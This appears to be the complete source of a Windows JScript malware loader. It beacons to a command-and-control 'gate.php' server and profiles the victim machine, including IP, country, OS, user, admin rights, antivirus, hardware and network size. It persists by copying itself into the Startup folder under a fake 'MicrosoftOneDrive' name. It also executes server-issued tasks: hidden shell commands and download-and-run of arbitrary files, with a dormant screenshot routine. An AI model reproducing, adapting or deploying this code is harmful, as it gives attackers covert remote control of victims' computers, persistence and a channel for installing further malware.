// Loader version
var version = "1.0.5";

// Server
var server = "http://localhost/avatar-beta/server/gate.php";

// Interval between knocks in seconds
var interval = 10;

// How many times repeat failed task
var attemptsCount = 3;

// Status of running loader
var status = "Active";

// Path for download files
var wss = new ActiveXObject('WScript.Shell');
var defaultPath = wss.ExpandEnvironmentStrings('%APPDATA%');
var scriptFullPath = WScript.ScriptFullName;
var scriptName = WScript.ScriptName;
var fakeAutorunName = "MicrosoftOneDrive";
var shellObj = WScript.createObject("WScript.Shell");

// Connecting JSON module
ImportJSON();

// Collecting PC information
var clientInfo = GetClientInfo();

// Adding script to autorun
AddToAutorun();

// Capture Screenshot of Desktop
//TakeScreenshot();

// Starting loader
while (status == "Active") {
    DoTasks(SendClientInfo());
    WScript.sleep(interval * 1000);
    DoTasks(SendKnock());
}

function SendClientInfo() {
    var response;
    try {
        var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        var temp = WinHttpReq.Open("POST", server, false);
        WinHttpReq.SetRequestHeader("Content-Type", "application/json");
        WinHttpReq.SetRequestHeader("mode", "info");
        WinHttpReq.SetRequestHeader("uuid", clientInfo["uuid"]);
        WinHttpReq.SetRequestHeader("version", version);
        WinHttpReq.Send(JSON.stringify(clientInfo));
        WinHttpReq.WaitForResponse();
        response = WinHttpReq.ResponseText;
    } catch (objError) {
        response = objError + "\n"
        response += "WinHTTP returned error: " + 
            (objError.number & 0xFFFF).toString() + "\n\n";
        response += objError.description;
    }
    return response;
}

function SendKnock() {
    var response;
    try {
        var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        var temp = WinHttpReq.Open("POST", server, false);
        WinHttpReq.SetRequestHeader("Accept", "application/json");
        WinHttpReq.SetRequestHeader("mode", "knock");
        WinHttpReq.SetRequestHeader("uuid", clientInfo["uuid"]);
        WinHttpReq.SetRequestHeader("version", version);
        WinHttpReq.Send();
        WinHttpReq.WaitForResponse();
        response = WinHttpReq.ResponseText;
    } catch (objError) {
        response = objError + "\n"
        response += "WinHTTP returned error: " + 
            (objError.number & 0xFFFF).toString() + "\n\n";
        response += objError.description;
    }
    return response;
}

function SendTaskResult(taskID, result, details) {
    var response;
    try {
        var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        var temp = WinHttpReq.Open("POST", server, false);
        WinHttpReq.SetRequestHeader("Accept", "application/json");
        WinHttpReq.SetRequestHeader("mode", "task");
        WinHttpReq.SetRequestHeader("uuid", clientInfo["uuid"]);
        WinHttpReq.SetRequestHeader("taskID", taskID);
        WinHttpReq.SetRequestHeader("result", result);
        WinHttpReq.SetRequestHeader("details", details);
        WinHttpReq.Send();
        WinHttpReq.WaitForResponse();
        response = WinHttpReq.ResponseText;
    } catch (objError) {
        response = objError + "\n"
        response += "WinHTTP returned error: " + 
            (objError.number & 0xFFFF).toString() + "\n\n";
        response += objError.description;
    }
}

function DoTasks(tasksJson) {
    if (tasksJson.length < 5) {
        return;
    }
    
    var result = 'False';
    var attempts = 0;
    var details = "";
    
    try {
        tasks = JSON.parse(tasksJson);
    } catch (err) {
        return;
    }
    
    for (var task in tasks) {
        result = 'False';
        attempts = attemptsCount;
        details = "";
        
        while ( (attempts > 0) && (result != 'True') ) {
            switch (tasks[task]["type"]) {
                case "Download & Execute":
                    result = DownloadAndExecute(tasks[task]["content"]);
                    if (result == 'False')
                        details = "Error: download or executing file failed";
                    break;
                case "Execute":
                    result = Execute(tasks[task]["content"]);
                    if (result == 'False')
                        details = "Error: executing file failed";
                    break;
                case "Terminate":
                    status = "Stopped";
                    result = 'True';
                    break;
                default:
                    result = 'False';
                    details = "Error: unknown task type";
                    break;
            }
            if (result == 'False')
                attempts--;
            else
                details = "Success";
            SendTaskResult(tasks[task]["id"], result, details);
        }
    };
}

function Execute(command) {
    try {
        shellObj.run("%comspec% /c " + command, 0, true);
        return 'True';
    } catch (err) {
        return 'False';
    }
}

function GetFilenameFromURL(url) {
    var filename = url.split('/')[url.split('/').length-1];
    return filename;
}

function DownloadAndExecute(url) {
    var filename = GetFilenameFromURL(url);
    if (url.indexOf('http') == -1)
        url = 'http://' + url;
    var saveTo = defaultPath + '\\' + filename;
    var WinHttpObj = WScript.CreateObject("WinHttp.WinHttpRequest.5.1");
    
    try {
        WinHttpObj.open("GET", url, false);
        WinHttpObj.setRequestHeader("cache-control", "max-age=0");
        WinHttpObj.send();

        var fsObj = WScript.CreateObject("Scripting.FileSystemObject");
        if(fsObj.fileExists(saveTo)){
            fsObj.deleteFile(saveTo);
        }
        if (WinHttpObj.status == 200){
            var streamObj = WScript.CreateObject("ADODB.Stream");
            streamObj.Type = 1; 
            streamObj.Open();
            streamObj.Write(WinHttpObj.responseBody);
            streamObj.SaveToFile(saveTo);
            streamObj.close();
            streamObj = null;
        }
        if (fsObj.fileExists(saveTo)){
            shellObj.run(fsObj.getFile(saveTo).shortPath);
            return 'True';
        }
    } catch (err) {
        return 'False';
    }
    return 'False';
}

function ExecuteAndOutput(command) {
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var wshShell = new ActiveXObject("WScript.Shell");
    do {
        var tempName = fso.BuildPath(fso.GetSpecialFolder(2), fso.GetTempName());
    } while ( fso.FileExists(tempName) );
    var cmdLine = fso.BuildPath(fso.GetSpecialFolder(1), "cmd.exe") + ' /C ' + command + ' > "' + tempName + '"';
    wshShell.Run(cmdLine, 0, true);
    var result = "";
    try {
        var ts = fso.OpenTextFile(tempName, 1, false);
        result = ts.ReadAll();
        ts.Close();
    } catch (err) { }
    return result;
}

function GetClientInfo() {
    var initInfo = new Object();
    
    // Retrieve UUID
    try {
        var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
        for ( var i=new Enumerator(wmi.ExecQuery("SELECT * FROM Win32_ComputerSystemProduct")); !i.atEnd(); i.moveNext() )
        initInfo["uuid"] = i.item().UUID;
    } catch (err) {
        initInfo["uuid"] = 'N/A';
    }
    
    // Retrieve client IP
    try {
        var ipReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        ipReq.Open("GET", "http://ipinfo.io/ip", false);
        ipReq.Send();
        ipReq.WaitForResponse();
        ipRes = ipReq.ResponseText;
        initInfo["ip"] = ipRes.replace(/^\s+|\s+$/g, '');
    } catch (err) {
        initInfo["ip"] = 'N/A';
    }
    
    // Retrieve country
    try {
        var countryReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        countryReq.Open("GET", "http://ipinfo.io/country", false);
        countryReq.Send();
        countryReq.WaitForResponse();
        countryRes = countryReq.ResponseText;
        initInfo["location"] = countryRes.replace(/^\s+|\s+$/g, '');  
    } catch (err) {
        initInfo["location"] = 'N/A';
    }
    
    // Retrieve OS name
    try {
        for ( var i=new Enumerator(wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem")); !i.atEnd(); i.moveNext() )
        initInfo["os"] = i.item().Caption;
    } catch (err) {
        initInfo["os"] = 'N/A';
    }
    
    // Retrieve User name
    try {
        var shellObj = new ActiveXObject("WScript.Shell");
        var netObj = new ActiveXObject("WScript.Network");
        initInfo["user"] = netObj.ComputerName + '/' + shellObj.ExpandEnvironmentStrings("%USERNAME%");
    } catch (err) {
        initInfo["user"] = 'N/A';
    }

    // Retrieve user role
    try {
        initInfo["role"] = "User";
        var groupObj = GetObject("WinNT://" + netObj.UserDomain + "/" + shellObj.ExpandEnvironmentStrings("%USERNAME%"))
        for (propObj in groupObj.Members)
            if (propObj.Name == "Administrators")
                initInfo["role"] = "Admin";
    } catch (err) {
        initInfo["role"] = 'N/A';
    }
    
    // Retrieve antivirus info
    try {
        var wmiAV = GetObject("winmgmts:root\\SecurityCenter2");
        for ( var i=new Enumerator(wmiAV.ExecQuery("SELECT * FROM AntivirusProduct")); !i.atEnd(); i.moveNext() )
            if (!initInfo["antivirus"])
                initInfo["antivirus"] = i.item().displayName;     
    } catch (err) {
        initInfo["antivirus"] = 'N/A';
    }

    // Retrieve CPU name
    try {
        for ( var i=new Enumerator(wmi.ExecQuery("SELECT * FROM Win32_Processor")); !i.atEnd(); i.moveNext() )
            initInfo["cpu"] = i.item().Name;
    } catch (err) {
        initInfo["cpu"] = 'N/A';
    }

    // Retrieve GPU name
    try {
        for ( var i=new Enumerator(wmi.ExecQuery("SELECT * FROM Win32_VideoController")); !i.atEnd(); i.moveNext() )
            initInfo["gpu"] = i.item().Name;
    } catch (err) {
        initInfo["gpu"] = 'N/A';
    }

    // Retrieve RAM
    try {
        var ramObj = WScript.CreateObject("Shell.Application");
        initInfo["ram"] = Math.round(ramObj.GetSystemInformation("PhysicalMemoryInstalled") / 1048576) + ' MB';
    } catch (err) {
        initInfo["ram"] = 'N/A';
    }
    
    // Retrieve total storage space
    try {
        var available = 0;
        var total = 0;
        for ( var i=new Enumerator(wmi.ExecQuery("SELECT * FROM Win32_LogicalDisk")); !i.atEnd(); i.moveNext() ) {
            if (i.item().Size != null) {
                available += (i.item().FreeSpace / 1024 / 1024 / 1024);
                total += (i.item().Size / 1024 / 1024 / 1024);
            }
        }
        initInfo["storage"] = Math.round(available) + ' / ' + Math.round(total) + ' GB';
    } catch (err) {
        initInfo["storage"] = '0 / 0 GB';
    }
    
    // Retrieve count of PC in network
    try {
        var pcs = 0;
        var output = ExecuteAndOutput("net view");
        var lines = output.split('\n');
        if (lines.length > 6)
            pcs = lines.length - 6;
        initInfo["network"] = pcs;
    } catch (err) {
        initInfo["network"] = '0';
    }
    
    // Retrieve loader version
    initInfo["version"] = version;

    return initInfo;
}

function TakeScreenshot() {
    var oWordBasic = new ActiveXObject("Word.Basic");
    oWordBasic.SendKeys("{prtsc}"); 
    WScript.Sleep(2000);

    var WshShell = new ActiveXObject("WScript.Shell");
    WshShell.SendKeys("{prtsc}");
    WshShell.Run("mspaint");
    WScript.Sleep(2000);

    //var shl = new ActiveXObject("shell.application");
    WScript.Sleep(1000);
    WScript.Sleep(1000);
    WshShell.AppActivate("Paint");

    WScript.Sleep(5000);
    WshShell.SendKeys("^v");
    WScript.Sleep(500);
    WshShell.SendKeys("^s");
    WScript.Sleep(500);
    WshShell.SendKeys(defaultPath + '\\' + clientInfo["uuid"] + '.jpg');
    WScript.Sleep(500);
    WshShell.SendKeys("{ENTER}");
}

function AddToAutorun() {
    try {
        startupPath = defaultPath + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\';
        fsObj = WScript.CreateObject('Scripting.FileSystemObject');   
        fsObj.CopyFile(scriptFullPath, startupPath);
    } catch (err) { return; }
}

function ImportJSON() {
    var xObj = WSH.CreateObject('Microsoft.XMLHTTP'),
    fso = WSH.CreateObject('Scripting.FileSystemObject'),
    temp = WSH.CreateObject('WScript.Shell').Environment('Process')('temp'),
    j2lib = 'https://raw.githubusercontent.com/douglascrockford/JSON-js/master/json2.js'

    if (fso.FileExists(temp + '\\json2.js')) {
        j2lib = fso.OpenTextFile(temp + '\\json2.js', 1);
        eval(j2lib.ReadAll());
        j2lib.Close();
    }
    else {
        with (xObj) {
            open("GET", j2lib, true);
            setRequestHeader('User-Agent', 'XMLHTTP/1.0');
            send('');
        }

        while (xObj.readyState != 4) WSH.Sleep(50);
        eval(xObj.responseText);
        j2lib = fso.CreateTextFile(temp + '\\json2.js', true);
        j2lib.Write(xObj.responseText);
        j2lib.Close();
    }
}